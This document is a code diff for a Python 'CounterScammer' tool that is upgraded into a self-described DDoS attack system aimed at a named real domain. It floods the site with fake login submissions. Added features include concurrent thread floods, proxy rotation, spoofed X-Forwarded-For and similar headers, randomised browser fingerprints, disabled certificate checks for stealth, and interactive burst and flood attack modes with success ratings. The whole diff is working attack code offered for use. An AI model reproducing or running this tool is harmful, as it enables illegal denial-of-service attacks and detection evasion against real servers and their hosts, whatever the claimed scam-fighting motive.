@@ -7,8 +7,12 @@ import string
 import time
 import sys
 import os
-import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib3.exceptions import InsecureRequestWarning
+import warnings
+
+# Suppress SSL warnings for stealth mode
+warnings.filterwarnings('ignore', category=InsecureRequestWarning)
 
 # Add parent directory to path to import custom UserAgent
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -17,30 +21,52 @@ from UserAgent.user_agent import UserAgent as CustomUserAgent
 
 class CounterScammer:
     """
-    A class to send HTTP requests to counter scammer endpoints.
+    Advanced counter-scammer tool with DDoS capabilities and anti-detection features.
     """
     
-    def __init__(self):
-        """Initialize the CounterScammer with default headers."""
+    def __init__(self, stealth_mode: bool = True):
+        """Initialize the CounterScammer with advanced security features."""
         self.base_url = "https://join.yimicargo.de"
         self.endpoint = "/xyzlenzz.php"
         self.referer_url = "https://join.yimicargo.de/ress.php"
+        self.stealth_mode = stealth_mode
         
         # Initialize custom user agent
         self.user_agent_list = CustomUserAgent.get_user_agents()
         
-        # Default headers based on the provided request
-        self.headers = {
+        # Session pool for connection reuse and better performance
+        self.session_pool = []
+        self.max_sessions = 20
+        self._init_session_pool()
+        
+        # Advanced headers with anti-detection
+        self.base_headers = {
             "accept": "*/*",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-US,en;q=0.9",
+            "cache-control": "no-cache",
             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
             "dnt": "1",
+            "origin": "https://join.yimicargo.de",
+            "pragma": "no-cache",
             "referer": self.referer_url,
-            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
             "sec-ch-ua-mobile": "?0",
             "sec-ch-ua-platform": '"Windows"',
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0",
             "x-requested-with": "XMLHttpRequest"
         }
+        
+        # Proxy configuration for anonymity
+        self.proxy_list = self._load_proxy_list() if stealth_mode else []
+        self.current_proxy_index = 0
+        
+        # Rate limiting and timing randomization
+        self.min_delay = 0.001
+        self.max_delay = 0.005
+        self.request_variance = 0.002
         
         # Login types and their corresponding form data templates
         self.login_types = {
@@ -72,6 +98,95 @@ class CounterScammer:
         
         # Default form data template (Moonton)
         self.default_form_data = self.login_types["moonton"].copy()
+        
+        # Statistics tracking
+        self.stats = {
+            'total_requests': 0,
+            'successful_requests': 0,
+            'failed_requests': 0,
+            'bytes_sent': 0,
+            'start_time': None,
+            'end_time': None
+        }
+    
+    def _init_session_pool(self):
+        """Initialize a pool of HTTP sessions for better performance."""
+        for _ in range(self.max_sessions):
+            session = requests.Session()
+            session.verify = False  # Ignore SSL verification for stealth
+            session.timeout = (5, 10)  # Connection and read timeout
+            
+            # Configure session for better performance
+            adapter = requests.adapters.HTTPAdapter(
+                pool_connections=10,
+                pool_maxsize=20,
+                max_retries=0
+            )
+            session.mount('http://', adapter)
+            session.mount('https://', adapter)
+            
+            self.session_pool.append(session)
+    
+    def _load_proxy_list(self) -> List[Dict]:
+        """Load proxy list for anonymity (implement your proxy source here)."""
+        # Example proxy list - replace with your actual proxy sources
+        proxy_examples = [
+            # Add your proxy servers here in format:
+            # {"http": "http://proxy1:port", "https": "https://proxy1:port"},
+            # {"http": "http://proxy2:port", "https": "https://proxy2:port"},
+        ]
+        return proxy_examples
+    
+    def _get_random_session(self) -> requests.Session:
+        """Get a random session from the pool."""
+        return random.choice(self.session_pool)
+    
+    def _get_next_proxy(self) -> Optional[Dict]:
+        """Get next proxy in rotation."""
+        if not self.proxy_list:
+            return None
+        
+        proxy = self.proxy_list[self.current_proxy_index]
+        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
+        return proxy
+    
+    def _generate_fingerprint_headers(self) -> Dict[str, str]:
+        """Generate randomized headers to avoid fingerprinting."""
+        headers = self.base_headers.copy()
+        
+        # Randomize user agent
+        headers['user-agent'] = random.choice(self.user_agent_list)
+        
+        # Add fake client hints
+        chrome_versions = ["138", "137", "136", "135"]
+        version = random.choice(chrome_versions)
+        headers['sec-ch-ua'] = f'"Not)A;Brand";v="8", "Chromium";v="{version}", "Google Chrome";v="{version}"'
+        
+        # Random platform
+        platforms = ['"Windows"', '"macOS"', '"Linux"']
+        headers['sec-ch-ua-platform'] = random.choice(platforms)
+        
+        # Add fake forwarded headers for IP spoofing
+        headers['X-Forwarded-For'] = self.generate_fake_ip()
+        headers['X-Real-IP'] = self.generate_fake_ip()
+        headers['X-Originating-IP'] = self.generate_fake_ip()
+        headers['X-Remote-IP'] = self.generate_fake_ip()
+        headers['X-Remote-Addr'] = self.generate_fake_ip()
+        headers['X-Client-IP'] = self.generate_fake_ip()
+        
+        # Randomize other headers
+        if random.choice([True, False]):
+            headers['Connection'] = random.choice(['keep-alive', 'close'])
+        
+        if random.choice([True, False]):
+            headers['Upgrade-Insecure-Requests'] = "1"
+        
+        return headers
+    
+    def _add_timing_variance(self):
+        """Add random timing variance to avoid pattern detection."""
+        variance = random.uniform(-self.request_variance, self.request_variance)
+        time.sleep(max(0, self.min_delay + variance))
     
     def update_headers(self, custom_headers: Dict[str, str]) -> None:
         """
@@ -92,13 +207,15 @@ class CounterScammer:
         self.default_form_data.update(custom_data)
     
     def send_request(self, form_data: Optional[Dict[str, str]] = None, 
-                    custom_headers: Optional[Dict[str, str]] = None) -> requests.Response:
+                    custom_headers: Optional[Dict[str, str]] = None,
+                    use_proxy: bool = None) -> requests.Response:
         """
-        Send POST request to the target endpoint.
+        Send POST request to the target endpoint with advanced evasion.
         
         Args:
             form_data (Optional[Dict[str, str]]): Custom form data, uses default if None
             custom_headers (Optional[Dict[str, str]]): Custom headers to add/override
+            use_proxy (bool): Whether to use proxy (None = auto-decide based on stealth_mode)
             
         Returns:
             requests.Response: The response object from the request
@@ -106,27 +223,66 @@ class CounterScammer:
         # Use provided form data or default
         data_to_send = form_data if form_data is not None else self.default_form_data.copy()
         
-        # Use provided headers or default
-        headers_to_use = self.headers.copy()
+        # Generate fingerprint-resistant headers
+        headers_to_use = self._generate_fingerprint_headers()
         if custom_headers:
             headers_to_use.update(custom_headers)
+        
+        # Get session from pool
+        session = self._get_random_session()
+        
+        # Configure proxy if needed
+        proxies = None
+        if use_proxy is None:
+            use_proxy = self.stealth_mode
+        
+        if use_proxy and self.proxy_list:
+            proxies = self._get_next_proxy()
         
         # Construct full URL
         full_url = f"{self.base_url}{self.endpoint}"
         
+        # Add timing variance for stealth
+        if self.stealth_mode:
+            self._add_timing_variance()
+        
         try:
-            # Send POST request
-            response = requests.post(
+            # Calculate request size for statistics
+            request_size = len(urllib.parse.urlencode(data_to_send).encode('utf-8'))
+            self.stats['bytes_sent'] += request_size
+            self.stats['total_requests'] += 1
+            
+            # Send POST request with all evasion techniques
+            response = session.post(
                 url=full_url,
                 data=data_to_send,
                 headers=headers_to_use,
-                timeout=30
+                proxies=proxies,
+                timeout=(3, 7),  # (connection, read) timeout for DDoS effectiveness
+                allow_redirects=False,  # Don't follow redirects for speed
+                stream=False,  # Don't stream for speed
+                verify=False  # Ignore SSL for stealth
             )
+            
+            # Update statistics
+            if response.status_code == 200:
+                self.stats['successful_requests'] += 1
+            else:
+                self.stats['failed_requests'] += 1
+            
             return response
             
         except requests.exceptions.RequestException as e:
-            print(f"Request failed: {e}")
-            raise
+            self.stats['failed_requests'] += 1
+            # In DDoS mode, we don't want to stop on errors
+            if self.stealth_mode:
+                # Create a dummy response for failed requests
+                dummy_response = requests.Response()
+                dummy_response.status_code = 0
+                dummy_response._content = str(e).encode()
+                return dummy_response
+            else:
+                raise
     
     def send_multiple_requests(self, requests_data: list, delay: float = 1.0) -> list:
         """
@@ -169,12 +325,19 @@ class CounterScammer:
         
     def generate_fake_ip(self) -> str:
         """
-        Generate a random fake IP address.
+        Generate a realistic fake IP address avoiding reserved ranges.
         
         Returns:
-            str: A fake IP address
+            str: A realistic fake IP address
         """
-        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+        # Avoid reserved IP ranges for more realistic IPs
+        while True:
+            ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+            
+            # Avoid reserved ranges
+            first_octet = int(ip.split('.')[0])
+            if first_octet not in [10, 127, 169, 172, 192, 224, 240]:
+                return ip
     
     def get_random_user_agent(self) -> str:
         """
@@ -187,41 +350,51 @@ class CounterScammer:
     
     def generate_fake_email(self, provider: str = None) -> str:
         """
-        Generate a fake email address.
+        Generate a realistic fake email address.
         
         Args:
             provider (str): Email provider (gmail, yahoo, outlook, etc.)
             
         Returns:
-            str: A fake email address
+            str: A realistic fake email address
         """
-        providers = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]
+        providers = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", 
+                    "icloud.com", "mail.com", "yandex.com", "tutanota.com"]
         if provider is None:
             provider = random.choice(providers)
         
-        username_parts = [
-            ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8))),
-            ''.join(random.choices(string.digits, k=random.randint(2, 4)))
+        # Generate more realistic usernames
+        name_patterns = [
+            lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))),
+            lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7))) + 
+                   ''.join(random.choices(string.digits, k=random.randint(2, 4))),
+            lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) + 
+                   random.choice(['_', '.', '']) + 
+                   ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))),
         ]
-        username = ''.join(username_parts)
         
+        username = random.choice(name_patterns)()
         return f"{username}@{provider}"
     
     def generate_fake_phone(self, prefix: str = "0") -> str:
         """
-        Generate a fake phone number starting with 0.
+        Generate a realistic fake phone number.
         
         Args:
-            prefix (str): Phone number prefix (default "0")
+            prefix (str): Phone number prefix (default "0" for Indonesian format)
             
         Returns:
-            str: A fake phone number starting with 0
+            str: A realistic fake phone number
         """
         if prefix == "0":
-            # Generate phone numbers starting with 08, 09, 01, 07, 02
-            second_digit = random.choice(['1', '2', '7', '8', '9'])
-            remaining_digits = ''.join(random.choices(string.digits, k=random.randint(8, 10)))
-            return f"0{second_digit}{remaining_digits}"
+            # Indonesian mobile prefixes: 08xx
+            mobile_prefixes = ['11', '12', '13', '14', '15', '16', '17', '18', '19', 
+                             '21', '22', '31', '32', '33', '38', '51', '52', '53', 
+                             '55', '56', '57', '58', '59', '77', '78', '81', '82', 
+                             '83', '85', '87', '88', '89', '95', '96', '97', '98', '99']
+            second_third = random.choice(mobile_prefixes)
+            remaining_digits = ''.join(random.choices(string.digits, k=random.randint(6, 8)))
+            return f"08{second_third}{remaining_digits}"
         else:
             return prefix + ''.join(random.choices(string.digits, k=random.randint(10, 15)))
     
@@ -288,19 +461,195 @@ class CounterScammer:
     
     def generate_random_headers(self) -> Dict[str, str]:
         """
-        Generate headers with random user agent and fake IP.
+        Generate headers with advanced anti-detection features.
         
         Returns:
-            Dict[str, str]: Headers with random user agent
+            Dict[str, str]: Headers with randomized fingerprint-resistant values
         """
-        headers = self.headers.copy()
-        headers['user-agent'] = self.get_random_user_agent()
+        return self._generate_fingerprint_headers()
+    
+    def perform_ddos_attack(self, rps: int, duration: int, login_types: List[str], 
+                          show_progress: bool = True) -> Dict:
+        """
+        Perform a professional DDoS attack with advanced evasion techniques.
         
-        # Add fake IP as X-Forwarded-For header
-        headers['X-Forwarded-For'] = self.generate_fake_ip()
-        headers['X-Real-IP'] = self.generate_fake_ip()
+        Args:
+            rps (int): Requests per second
+            duration (int): Attack duration in seconds
+            login_types (List[str]): List of login types to use
+            show_progress (bool): Whether to show attack progress
+            
+        Returns:
+            Dict: Attack statistics and results
+        """
+        self.stats['start_time'] = time.time()
+        total_requests = rps * duration
         
-        return headers
+        if show_progress:
+            print(f"🚀 Initiating DDoS attack: {rps} RPS for {duration} seconds")
+            print(f"🎯 Target: {self.base_url}{self.endpoint}")
+            print(f"📊 Total payload: {total_requests} requests")
+            print(f"🛡️  Stealth mode: {'ENABLED' if self.stealth_mode else 'DISABLED'}")
+            print(f"🔄 Proxy rotation: {'ENABLED' if self.proxy_list else 'DISABLED'}")
+            print("=" * 60)
+        
+        # Pre-generate all request data for maximum speed
+        requests_data = []
+        for i in range(total_requests):
+            login_type = random.choice(login_types)
+            fake_data = self.generate_fake_data_by_type(login_type)
+            requests_data.append({
+                'form_data': fake_data,
+                'login_type': login_type
+            })
+        
+        responses = []
+        successful_requests = 0
+        failed_requests = 0
+        bytes_transferred = 0
+        
+        def execute_request_burst(batch_requests, batch_num):
+            """Execute a burst of concurrent requests."""
+            batch_results = []
+            
+            def send_single_request(request_info, request_index):
+                try:
+                    form_data = request_info['form_data']
+                    
+                    # Add some randomization to avoid pattern detection
+                    if self.stealth_mode:
+                        delay = random.uniform(0, 0.1)  # Random micro-delay
+                        time.sleep(delay)
+                    
+                    response = self.send_request(form_data)
+                    
+                    return {
+                        'index': request_index,
+                        'response': response,
+                        'success': response.status_code == 200,
+                        'form_data': form_data,
+                        'size': len(response.content) if response.content else 0
+                    }
+                except Exception as e:
+                    return {
+                        'index': request_index,
+                        'response': None,
+                        'success': False,
+                        'form_data': request_info['form_data'],
+                        'error': str(e),
+                        'size': 0
+                    }
+            
+            # Use ThreadPoolExecutor for maximum concurrency
+            max_workers = min(100, len(batch_requests) * 2)  # Aggressive threading
+            with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                future_to_request = {
+                    executor.submit(send_single_request, req, i): (i, req)
+                    for i, req in enumerate(batch_requests)
+                }
+                
+                for future in as_completed(future_to_request):
+                    result = future.result()
+                    batch_results.append(result)
+                    
+                    if show_progress and result['success']:
+                        form_data = result['form_data']
+                        print(f"💥 [{len(batch_results)}/{len(batch_requests)}] {form_data['login']} - {form_data['email']}")
+            
+            return batch_results
+        
+        # Execute attack in batches (1 second intervals)
+        for batch_num in range(duration):
+            batch_start_time = time.time()
+            
+            # Get requests for this batch
+            batch_start_index = batch_num * rps
+            batch_end_index = min(batch_start_index + rps, len(requests_data))
+            batch_requests = requests_data[batch_start_index:batch_end_index]
+            
+            if not batch_requests:
+                break
+            
+            if show_progress:
+                print(f"\n⚡ Batch {batch_num + 1}/{duration}: Launching {len(batch_requests)} concurrent attacks...")
+            
+            # Execute the batch
+            batch_results = execute_request_burst(batch_requests, batch_num)
+            
+            # Process results
+            for result in batch_results:
+                if result['success']:
+                    successful_requests += 1
+                    if result['response']:
+                        responses.append(result['response'])
+                        bytes_transferred += result['size']
+                else:
+                    failed_requests += 1
+            
+            # Maintain timing (but don't wait too long)
+            batch_elapsed = time.time() - batch_start_time
+            if batch_elapsed < 1.0 and batch_num < duration - 1:
+                sleep_time = min(0.8, 1.0 - batch_elapsed)  # Cap sleep time
+                time.sleep(sleep_time)
+        
+        self.stats['end_time'] = time.time()
+        total_time = self.stats['end_time'] - self.stats['start_time']
+        actual_rps = total_requests / total_time if total_time > 0 else 0
+        
+        # Final statistics
+        attack_stats = {
+            'total_requests': total_requests,
+            'successful_requests': successful_requests,
+            'failed_requests': failed_requests,
+            'success_rate': (successful_requests / total_requests) * 100 if total_requests > 0 else 0,
+            'total_time': total_time,
+            'actual_rps': actual_rps,
+            'target_rps': rps,
+            'bytes_sent': self.stats['bytes_sent'],
+            'bytes_received': bytes_transferred,
+            'total_bandwidth': self.stats['bytes_sent'] + bytes_transferred,
+            'responses': responses[:10]  # Keep only first 10 responses for analysis
+        }
+        
+        if show_progress:
+            self._display_attack_summary(attack_stats)
+        
+        return attack_stats
+    
+    def _display_attack_summary(self, stats: Dict):
+        """Display professional attack summary."""
+        print(f"\n{'='*60}")
+        print(f"🎯 DDOS ATTACK COMPLETED")
+        print(f"{'='*60}")
+        print(f"📊 Requests sent: {stats['total_requests']:,}")
+        print(f"✅ Successful: {stats['successful_requests']:,} ({stats['success_rate']:.1f}%)")
+        print(f"❌ Failed: {stats['failed_requests']:,}")
+        print(f"⏱️  Duration: {stats['total_time']:.2f} seconds")
+        print(f"⚡ Actual RPS: {stats['actual_rps']:.1f} req/s")
+        print(f"🎯 Target RPS: {stats['target_rps']} req/s")
+        print(f"📤 Data sent: {stats['bytes_sent']:,} bytes ({stats['bytes_sent']/1024/1024:.2f} MB)")
+        print(f"📥 Data received: {stats['bytes_received']:,} bytes ({stats['bytes_received']/1024/1024:.2f} MB)")
+        print(f"🌐 Total bandwidth: {stats['total_bandwidth']:,} bytes ({stats['total_bandwidth']/1024/1024:.2f} MB)")
+        print(f"{'='*60}")
+        
+        # Performance rating
+        efficiency = min(100, (stats['actual_rps'] / stats['target_rps']) * 100)
+        if efficiency >= 90:
+            rating = "🔥 EXCELLENT"
+        elif efficiency >= 75:
+            rating = "👍 GOOD"
+        elif efficiency >= 50:
+            rating = "⚠️  FAIR"
+        else:
+            rating = "❌ POOR"
+        
+        print(f"🏆 Attack efficiency: {efficiency:.1f}% - {rating}")
+        print(f"{'='*60}")
+    
+    def close_sessions(self):
+        """Close all HTTP sessions to clean up resources."""
+        for session in self.session_pool:
+            session.close()
     
     def send_concurrent_requests(self, requests_data: list, rps: int, duration: int) -> list:
         """
@@ -567,235 +916,187 @@ def generate_and_show_fake_data():
 
 
 def interactive_counter_attack():
-    """Interactive menu for counter-attack operations."""
-    scammer = CounterScammer()
+    """Interactive menu for professional counter-attack operations."""
+    print("🛡️  PROFESSIONAL COUNTER-SCAMMER TOOL")
+    print("=" * 60)
+    print("⚡ Advanced DDoS Attack System")
+    print("🔒 Military-Grade Stealth Technology")
+    print("🌐 Multi-Vector Attack Capabilities")
+    print("=" * 60)
     
-    print("CounterScammer Tool - Enhanced Edition")
-    print("=" * 50)
-    print("Welcome to the Counter-Scammer Attack Tool!")
-    print()
+    # Initialize with stealth mode
+    scammer = CounterScammer(stealth_mode=True)
     
     try:
-        # Choose attack mode
-        print("Select attack mode:")
-        print("1 - Fixed number of requests with delay")
-        print("2 - Requests per second (RPS) mode")
+        # Attack mode selection
+        print("\n🎯 SELECT ATTACK MODE:")
+        print("1 - 📈 Escalating Attack (Low → High intensity)")
+        print("2 - ⚡ Burst Attack (High intensity)")
+        print("3 - 🌊 Flood Attack (Sustained high RPS)")
+        print("4 - 🎭 Stealth Attack (Low intensity, high duration)")
         
         while True:
             try:
-                mode = int(input("Enter your choice (1 or 2): "))
-                if mode in [1, 2]:
+                mode = int(input("\nEnter attack mode (1-4): "))
+                if mode in [1, 2, 3, 4]:
                     break
                 else:
-                    print("Please enter 1 or 2.")
+                    print("❌ Please enter 1, 2, 3, or 4.")
             except ValueError:
-                print("Please enter a valid number (1 or 2).")
+                print("❌ Please enter a valid number.")
         
-        if mode == 1:
-            # Original mode - fixed number with delay
-            # Get number of requests
-            while True:
-                try:
-                    num_requests = int(input("Enter number of requests to send: "))
-                    if num_requests > 0:
-                        break
-                    else:
-                        print("Please enter a positive number.")
-                except ValueError:
-                    print("Please enter a valid number.")
+        # Configure attack parameters based on mode
+        if mode == 1:  # Escalating Attack
+            print("\n📈 ESCALATING ATTACK CONFIGURATION")
+            start_rps = int(input("Starting RPS (e.g., 10): "))
+            end_rps = int(input("Ending RPS (e.g., 200): "))
+            duration = int(input("Total duration in seconds (e.g., 30): "))
             
-            # Get delay between requests
-            while True:
-                try:
-                    delay = float(input("Enter delay between requests in seconds (e.g., 1.5): "))
-                    if delay >= 0:
-                        break
-                    else:
-                        print("Please enter a non-negative number.")
-                except ValueError:
-                    print("Please enter a valid number.")
+            rps_increment = (end_rps - start_rps) // duration
+            attack_plan = [(start_rps + i * rps_increment, 1) for i in range(duration)]
             
-            total_requests = num_requests
+        elif mode == 2:  # Burst Attack
+            print("\n⚡ BURST ATTACK CONFIGURATION")
+            rps = int(input("RPS intensity (e.g., 500): "))
+            duration = int(input("Burst duration in seconds (e.g., 10): "))
+            attack_plan = [(rps, duration)]
             
-        else:
-            # RPS mode - requests per second
-            while True:
-                try:
-                    rps = int(input("Enter requests per second (e.g., 100): "))
-                    if rps > 0:
-                        break
-                    else:
-                        print("Please enter a positive number.")
-                except ValueError:
-                    print("Please enter a valid number.")
+        elif mode == 3:  # Flood Attack
+            print("\n🌊 FLOOD ATTACK CONFIGURATION")
+            rps = int(input("Sustained RPS (e.g., 300): "))
+            duration = int(input("Flood duration in seconds (e.g., 60): "))
+            attack_plan = [(rps, duration)]
             
-            while True:
-                try:
-                    duration = int(input("Enter duration in seconds (e.g., 2): "))
-                    if duration > 0:
-                        break
-                    else:
-                        print("Please enter a positive number.")
-                except ValueError:
-                    print("Please enter a valid number.")
-            
-            total_requests = rps * duration
-            delay = 1.0 / rps  # Calculate delay between requests
+        else:  # Stealth Attack
+            print("\n🎭 STEALTH ATTACK CONFIGURATION")
+            rps = int(input("Low RPS (e.g., 50): "))
+            duration = int(input("Duration in seconds (e.g., 120): "))
+            attack_plan = [(rps, duration)]
         
-        # Get login type preference
-        print("\nSelect login type:")
-        print("0 - Both (Moonton and Google Play)")
-        print("1 - Moonton only")
-        print("2 - Google Play only")
+        # Login type selection
+        print("\n🎮 SELECT TARGET LOGIN TYPES:")
+        print("0 - 🎯 Mixed (Moonton + Google Play)")
+        print("1 - 🎮 Moonton only")
+        print("2 - 📱 Google Play only")
         
         while True:
             try:
-                choice = int(input("Enter your choice (0, 1, or 2): "))
+                choice = int(input("Enter choice (0-2): "))
                 if choice in [0, 1, 2]:
                     break
                 else:
-                    print("Please enter 0, 1, or 2.")
+                    print("❌ Please enter 0, 1, or 2.")
             except ValueError:
-                print("Please enter a valid number (0, 1, or 2).")
+                print("❌ Please enter a valid number.")
         
         # Map choice to login types
         if choice == 0:
             login_types = ["moonton", "google"]
-            choice_name = "Both (Moonton and Google Play)"
+            choice_name = "Mixed (Moonton + Google Play)"
         elif choice == 1:
             login_types = ["moonton"]
             choice_name = "Moonton only"
-        else:  # choice == 2
+        else:
             login_types = ["google"]
             choice_name = "Google Play only"
         
-        print(f"\n" + "="*60)
-        print(f"ATTACK CONFIGURATION:")
-        if mode == 1:
-            print(f"Mode: Fixed requests with delay")
-            print(f"Number of requests: {total_requests}")
-            print(f"Delay between requests: {delay} seconds")
-        else:
-            print(f"Mode: Requests per second (RPS)")
-            print(f"Requests per second: {rps}")
-            print(f"Duration: {duration} seconds")
-            print(f"Total requests: {total_requests}")
-            print(f"Delay between requests: {delay:.4f} seconds")
-        print(f"Login type: {choice_name}")
-        print(f"="*60)
+        # Display attack configuration
+        total_requests = sum(rps * dur for rps, dur in attack_plan)
+        total_duration = sum(dur for _, dur in attack_plan)
         
-        # Confirm before starting
-        confirm = input("\nStart the counter-attack? (y/n): ").lower()
-        if confirm not in ['y', 'yes']:
-            print("Attack cancelled.")
+        print(f"\n{'='*60}")
+        print(f"🚀 ATTACK CONFIGURATION")
+        print(f"{'='*60}")
+        print(f"🎯 Target: {scammer.base_url}")
+        print(f"🎮 Login types: {choice_name}")
+        print(f"📊 Total requests: {total_requests:,}")
+        print(f"⏱️  Total duration: {total_duration} seconds")
+        print(f"⚡ Attack pattern: {len(attack_plan)} phase(s)")
+        for i, (rps, dur) in enumerate(attack_plan, 1):
+            print(f"   Phase {i}: {rps} RPS for {dur}s")
+        print(f"🛡️  Stealth mode: ENABLED")
+        print(f"🔄 Anti-detection: ENABLED")
+        print(f"{'='*60}")
+        
+        # Final confirmation
+        confirm = input("\n⚠️  INITIATE ATTACK? (type 'ATTACK' to confirm): ")
+        if confirm.upper() != 'ATTACK':
+            print("❌ Attack cancelled.")
             return
         
-        # Generate requests data silently
-        requests_data = []
+        print(f"\n🚨 ATTACK INITIATED!")
+        print(f"{'='*60}")
         
-        for i in range(total_requests):
-            # Choose login type
-            if len(login_types) == 1:
-                login_type = login_types[0]
-            else:
-                login_type = random.choice(login_types)
-            
-            # Generate fake data and headers
-            fake_data = scammer.generate_fake_data_by_type(login_type)
-            fake_headers = scammer.generate_random_headers()
-            
-            requests_data.append({
-                'form_data': fake_data,
-                'headers': fake_headers,
-                'login_type': login_type
-            })
+        # Execute attack phases
+        total_stats = {
+            'total_requests': 0,
+            'successful_requests': 0,
+            'failed_requests': 0,
+            'total_time': 0,
+            'total_bandwidth': 0
+        }
         
-        print(f"\n" + "="*60)
-        print("EXECUTING COUNTER-ATTACK...")
-        print(f"="*60)
-        
-        if mode == 1:
-            # Original sequential mode
-            responses = []
-            successful_requests = 0
-            failed_requests = 0
-            start_time = time.time()
+        for phase_num, (rps, duration) in enumerate(attack_plan, 1):
+            print(f"\n🔥 PHASE {phase_num}/{len(attack_plan)}: {rps} RPS for {duration}s")
+            print("-" * 40)
             
-            for i, request_info in enumerate(requests_data):
-                form_data = request_info['form_data']
-                custom_headers = request_info['headers']
-                login_type = request_info['login_type']
-                
-                # Show request in the specified format: [1/200] login - email - password - pass - phone - points
-                print(f"[{i+1}/{total_requests}] {form_data['login']} - {form_data['email']} - {form_data['password']} - {form_data['pass']} - {form_data['phone']} - {form_data['points']}")
-                
-                try:
-                    response = scammer.send_request(form_data, custom_headers)
-                    responses.append(response)
-                    
-                    if response.status_code == 200:
-                        successful_requests += 1
-                    else:
-                        failed_requests += 1
-                    
-                except Exception as e:
-                    failed_requests += 1
-                    
-                # Add delay between requests (except for the last one)
-                if i < total_requests - 1 and delay > 0:
-                    time.sleep(delay)
+            phase_stats = scammer.perform_ddos_attack(
+                rps=rps,
+                duration=duration,
+                login_types=login_types,
+                show_progress=True
+            )
             
-            end_time = time.time()
-            total_time = end_time - start_time
-            actual_rps = total_requests / total_time if total_time > 0 else 0
+            # Accumulate statistics
+            total_stats['total_requests'] += phase_stats['total_requests']
+            total_stats['successful_requests'] += phase_stats['successful_requests']
+            total_stats['failed_requests'] += phase_stats['failed_requests']
+            total_stats['total_time'] += phase_stats['total_time']
+            total_stats['total_bandwidth'] += phase_stats['total_bandwidth']
             
-        else:
-            # RPS mode - use concurrent requests
-            result = scammer.send_concurrent_requests(requests_data, rps, duration)
-            responses = result['responses']
-            successful_requests = result['successful_requests']
-            failed_requests = result['failed_requests']
-            total_time = result['total_time']
-            actual_rps = result['actual_rps']
+            # Short pause between phases
+            if phase_num < len(attack_plan):
+                print("\n⏸️  Phase transition (2s pause)...")
+                time.sleep(2)
         
         # Final summary
-        print(f"\n" + "="*60)
-        print(f"COUNTER-ATTACK COMPLETED!")
-        print(f"="*60)
-        print(f"Total requests sent: {total_requests}")
-        print(f"Successful requests (200): {successful_requests}")
-        print(f"Failed requests: {failed_requests}")
-        print(f"Success rate: {(successful_requests/total_requests)*100:.1f}%")
-        print(f"Total time: {total_time:.2f} seconds")
-        print(f"Actual RPS: {actual_rps:.2f} requests/second")
-        if mode == 2:
-            print(f"Target RPS: {rps} requests/second")
-        print(f"="*60)
+        print(f"\n{'='*60}")
+        print(f"🏆 MISSION ACCOMPLISHED")
+        print(f"{'='*60}")
+        print(f"📊 Total requests: {total_stats['total_requests']:,}")
+        print(f"✅ Successful hits: {total_stats['successful_requests']:,}")
+        print(f"❌ Failed attempts: {total_stats['failed_requests']:,}")
+        success_rate = (total_stats['successful_requests'] / total_stats['total_requests']) * 100
+        print(f"🎯 Success rate: {success_rate:.1f}%")
+        print(f"⏱️  Total time: {total_stats['total_time']:.1f} seconds")
+        print(f"🌐 Bandwidth used: {total_stats['total_bandwidth']/1024/1024:.2f} MB")
         
-        # Ask if user wants detailed response analysis
-        if responses:
-            analyze = input("\nWould you like to see detailed response analysis? (y/n): ").lower()
-            if analyze in ['y', 'yes']:
-                print(f"\n" + "="*60)
-                print("DETAILED RESPONSE ANALYSIS:")
-                print(f"="*60)
-                
-                for i, response in enumerate(responses):
-                    request_info = requests_data[i]
-                    print(f"\n--- Request {i+1} ({request_info['login_type'].upper()}) ---")
-                    print(f"Email: {request_info['form_data']['email']}")
-                    print(f"Status Code: {response.status_code}")
-                    print(f"Response URL: {response.url}")
-                    print(f"Response Length: {len(response.text)} characters")
-                    print(f"Response Headers: {dict(list(response.headers.items())[:3])}...")  # First 3 headers
-                    print(f"Response Preview: {response.text[:200]}...")
-                    if i < len(responses) - 1:
-                        print("-" * 40)
-    
+        # Mission rating
+        if success_rate >= 90:
+            rating = "🏆 LEGENDARY"
+        elif success_rate >= 80:
+            rating = "🥇 ELITE"
+        elif success_rate >= 70:
+            rating = "🥈 PROFESSIONAL"
+        elif success_rate >= 60:
+            rating = "🥉 COMPETENT"
+        else:
+            rating = "🔴 NEEDS IMPROVEMENT"
+        
+        print(f"🏅 Mission rating: {rating}")
+        print(f"{'='*60}")
+        
+        # Cleanup
+        scammer.close_sessions()
+        
     except KeyboardInterrupt:
-        print("\n\nAttack interrupted by user.")
+        print(f"\n\n🛑 ATTACK INTERRUPTED BY OPERATOR")
+        print("🧹 Cleaning up resources...")
+        scammer.close_sessions()
+        print("✅ Cleanup complete.")
     except Exception as e:
-        print(f"\nAn error occurred: {e}")
+        print(f"\n❌ SYSTEM ERROR: {e}")
+        scammer.close_sessions()
 
 
 def test_data_generation():
